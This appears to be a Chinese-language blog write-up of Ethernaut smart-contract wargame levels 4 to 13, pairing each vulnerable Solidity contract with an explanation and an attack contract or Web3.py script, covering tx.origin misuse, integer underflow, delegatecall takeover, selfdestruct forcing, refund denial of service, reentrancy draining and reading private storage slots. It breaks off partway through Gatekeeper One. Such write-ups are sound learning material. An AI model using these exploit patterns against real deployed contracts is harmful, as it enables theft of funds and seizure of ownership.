<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是成为该合约的 owner，但是调用 changeOwner 函数这笔交易的发起者不能是当前的消息发送者。</p>
<p>先想到通过构造攻击合约去调用 changeOwner ，因为交易发起者 tx.origin 是调用链最开始的调用者，而 msg.sender 是当前调用的消息发送者。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Telephone public myTelephone;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        myTelephone = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        myTelephone.changeOwner(0x42285Fb92421db39b7EddB9E245f4B092bb0e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309061646160.png"
                      alt="image-20230906164615093"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309061647466.png"
                      alt="image-20230906164727414"
                ></p>
<h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据提示，应该是溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071205880.png"
                      alt="image-20230907120509823"
                ></p>
<p>题目初始会给予20代币，那就试试看下溢出，即向一个账户转出21代币</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071220732.png"
                      alt="image-20230907122033703"
                ></p>
<p>挺多，应该是2^256^-1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071222831.png"
                      alt="image-20230907122210795"
                ></p>
<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的 fallback() 没有用 payable 修饰，所以转账额度只能是0。</p>
<p>这里的难点是理解并利用 delegatecall() 函数，这是一种特殊类型的消息调用，被称为<strong>委托调用</strong>。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 msg.sender 和 msg.value 不变。例如这题中就是利用委托调用来调用另一个合约中的函数。</p>
<p>那就试试看调用 pwn() 函数吧，直接在前端控制台 sendTransaction：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071441474.png"
                      alt="image-20230907144125428"
                ></p>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20230907143851572.png"
                      alt="image-20230907143851572"
                ></p>
<h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure></div>

<p>竟然是猫猫？（惊</p>
<p>目标是使合约的余额大于0，但看起来并没有能接收代币的函数在。</p>
<p>在寻找没有 payable 修饰的方法的情况下如何向该合约转账时，看到了官方文档的一些信息：</p>
<blockquote>
<p>一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 <code>selfdestruct</code> 的目标来接收以太币。</p>
</blockquote>
<p>看了一下，利用 selfdestruct 是比较实际的，selfdestruct 可以强制向合约转账。</p>
<p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Force force;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        force = Force(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fucntion hack() public &#123;</span><br><span class="line">        address payable addr = payable(address(force));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071550611.png"
                      alt="image-20230907155019552"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071550282.png"
                      alt="image-20230907155049231"
                ></p>
<h2 id="08-Vault"><a href="#08-Vault" class="headerlink" title="08 Vault"></a>08 Vault</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是让 locked 为 false，这里应该是要读取 private 的 password。</p>
<p>插槽 slot 是 Solidity 中合约的状态变量存储的地方，一个插槽有32字节的空间，存储的规则是从第一个状态变量开始逐项连续存储，第一个状态变量存储在 slot0 中，如果插槽剩余空间可以存下下一个状态变量，那么就在当前插槽继续存储，否则存储到下一插槽。很显然题目中的 bytes32 要放在 slot1 中了。</p>
<p>用 Web3.py 连接 Sepolia，然后读一下插槽。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309082340847.png"
                      alt="image-20230908234018791"
                ></p>
<p>拿到了 password</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309081451828.png"
                      alt="image-20230908145153648"
                ></p>
<h2 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题有点复杂，简单来说就像拍卖，谁价高谁是 king，但是当前出价会给到被推翻的 king。此外，当提交实例时，关卡将收回王权，要绕过这个东西。</p>
<p>看了一下，初始的出价为 0.001ETH 拿到 king 是没问题的，问题在于提交时的操作，绕过那个王权收回，没啥头绪。最后收回的操作应该是通过 owner 调用 receive() 实现的，收回后出价会变回0。</p>
<p>那么我们只需要在合约转账给被推翻的 king 时拒收，就可以阻止王权的收回了。</p>
<p>为此，我们需要一个攻击合约，普通的账户并不能拒收转账。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    address payable target;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.sender != target);</span><br><span class="line">        (bool success,) = target.call&#123;value: 0.0001 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Something went wrong&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意转账的方式：transfer() 和 send() 有2300的 gas 限制，所以要使用 call()。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310200456079.png"
                      alt="image-20231020045629006"
                ></p>
<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10 Re-entrancy"></a>10 Re-entrancy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是掏空合约余额。</p>
<p>标题为重入攻击，原理为：</p>
<p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的 Fallback 函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做重入攻击。</p>
<p>本题在 withdraw 函数中采用了先转账后扣取余额的顺序，可以利用攻击合约的回调函数进行重入。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Reentrance public myReentrance;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myReentrance = Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        myReentrance.donate&#123;value: msg.value&#125;(address(this));</span><br><span class="line">        myReentrance.withdraw(myReentrance.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(myReentrance).balance &gt;= 0.001 ether) &#123;</span><br><span class="line">            myReentrance.withdraw(0.001 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用 attack() 时 msg.value 必须大于等于 0.001ETH。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310230142626.png"
                      alt="image-20231023014236563"
                ></p>
<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>This elevator won’t let you reach the top of your building. Right?</p>
<p>这部电梯不会让你到达楼顶。对吧？</p>
<p>题目意思应该是要使 top 为 true。</p>
<p>题目中把 msg.sender 强制转换为 Building 接口的类型，即 msg.sender 必须是一个实现了 Building 接口的合约，至于使 top 为 true，写个函数骗过去就行了。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker is Building &#123;</span><br><span class="line">    Elevator public myelevator;</span><br><span class="line">    uint public n = 0;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myelevator = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myelevator.goTo(114514);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">        if (n == 0) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            n = 0;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310230249848.png"
                      alt="image-20231023024949802"
                ></p>
<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看上去就是要把这些 private 的变量读取，然后调用 unlock() 使 locked 为 false，想到读 slot。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>大小</th>
<th>插槽</th>
</tr>
</thead>
<tbody><tr>
<td>bool</td>
<td>1 Byte</td>
<td>Slot 0</td>
</tr>
<tr>
<td>uint256</td>
<td>32 Bytes</td>
<td>Slot 1</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint16</td>
<td>2 Bytes</td>
<td>Slot 2</td>
</tr>
<tr>
<td>bytes32[3]</td>
<td>96 Bytes</td>
<td>Slot 3, 4, 5</td>
</tr>
</tbody></table>
<p>经过对各个变量所用存储空间的计算，data[2] 存储于 slot5，上 python 脚本读吧。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.WebsocketProvider(<span class="string">&#x27;wss://sepolia.infura.io/ws/v3/5d13483fc1bf41359bbea6404e3bbc66&#x27;</span>))</span><br><span class="line"><span class="comment"># print(w3.is_connected())</span></span><br><span class="line"><span class="built_in">print</span>(w3.eth.get_storage_at(<span class="string">&#x27;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#x27;</span>, <span class="number">5</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>

<p>输出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@fatbee-laptop:/mnt/c/Users/13246/web3<span class="comment"># python py/hack_12.py</span></span><br><span class="line">0x6b6077ff2045271ed9c281d35cb5762eebd69455f990d6d1677c384638a0c72b</span><br></pre></td></tr></table></figure></div>

<p>在使用 bytes16() 对 bytes32 进行强制类型转换的时候，64 位十六进制数会只剩下前面的 32 位，使用其作为 unlock() 的参数进行调用即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310241010622.png"
                      alt="image-20231024101040557"
                ></p>
<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
</ul>
<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
<p>关于 <a class="link"   href="https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types" >Solidity 类型转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>gateThree_3</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里已知的部分是等号右边，tx.origin 即自己的地址，地址 address 类型是大小20字节的十六进制数，而 uint160 所占空间 160bits，即20字节，所以第一层类型转换不会出现信息丢失。</p>
<p>第二层类型转换是由 uint160 到 uint16，由大到小的类型转换必然会造成信息丢失，转换的具体情况：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint160(tx.origin): 0x42285Fb92421db39XXXXXXXXXX5f4B092bb0e411</span><br><span class="line">              (DEC: 377693759349744031XXXXXXXXXX57517436574663500817)</span><br><span class="line">uint16: 0xe411</span><br><span class="line">  (DEC: 58385)</span><br></pre></td></tr></table></figure></div>

<p>其实就是按照目标类型的大小，从右侧开始保留相应的数据，如上面保留2字节的数据。</p>
<p>以上的类型转换都是显式转换。等号的右边的数据类型是 uint16，左边是 uint32，那么两边在使用运算符计算的时候会进行隐式转换，且不造成信息丢失。</p>
<p>这里就是把 uint16 转换为 uint32，具体是在左侧补零，值保持不变。但是第一层是由 bytes8 转换至 uint64，看看如何转换。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint32(uint64(_gateKey)): 0x0000e411</span><br><span class="line">                    (DEC: 58385)</span><br><span class="line">uint64(_gateKey): 0x********0000e411</span><br><span class="line">            (DEC: Not sure)</span><br><span class="line">_gateKey: 0x********0000e411</span><br></pre></td></tr></table></figure></div>

<p>bytesN 类型只能转换为大小相同的 uint 类型，如上面的 bytes8 &#x3D;&gt; uint64，转换后无信息丢失。上面数据的星号可以用任意十六进制数代替。</p>
<p><strong>gateThree_2</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里比较好理解，由 uint64 到 uint32 的类型转换造成的信息丢失，又被 uint32 到 uint64 的隐式转换填充上了0，所以只需要往 _gateKey 的前半部分（星号部分）添加非0的数据即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_gateKey: 0x123456780000e411</span><br></pre></td></tr></table></figure></div>

<p>这样就能通过 gateThree 的第二部分。</p>
<p><strong>gateThree_1</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里左半边结果是<code>0x0000e411</code>，右半边是<code>0xe411</code>，所以只要不对相差的那四个0做改变就好，因为右半边进行隐式转换后也会变成<code>0x0000e411</code>。</p>
<p><strong>gateTwo</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(gasleft() % 8191 == 0);</span><br></pre></td></tr></table></figure></div>

<p>这里要求剩余的 gas 必须是8191的整数倍，且不能为0，因为 Solidity 对0取模会报出 Panic 错误。</p>
<p>这里需要看实际消耗的 gas，所以要利用以太坊浏览器上链调试，写个初步的攻击合约看看：</p>
